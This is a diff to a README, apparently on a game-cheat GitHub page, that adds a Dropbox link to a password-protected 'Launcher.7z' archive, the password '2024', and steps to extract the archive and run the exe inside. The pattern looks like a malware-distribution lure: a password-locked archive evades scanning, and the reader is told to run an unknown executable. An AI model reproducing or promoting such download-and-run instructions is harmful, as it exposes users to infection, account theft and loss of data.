@@ -1,8 +1,16 @@
 ![309460975-ea058c9d-ef38-407e-b8a8-8e47777cfc43](https://github.com/neverman62bearubear/deadside/assets/172965201/1b06c0e0-c058-4f4e-9ab6-2e1ad10e1a30)
 
 # 📁Software: [HERE](https://www.dropbox.com/scl/fi/a16t6l92xcslbz3p6tvhi/Launcher.7z?rlkey=3vmm42cwn04rdqfpcu721uf8q&st=gxobu0im&dl=0)
+# 🔑Password: 2024
 
-# 📌Information:
+1. Download the archive 
+2. Open archive (pass 2024)
+3. Run exe 
+4. Agree with terms 
+5. Click continue
+6. Enjoy
+
+### 📌Information:
 
 ⚠️If you can’t install program, you need to:
 
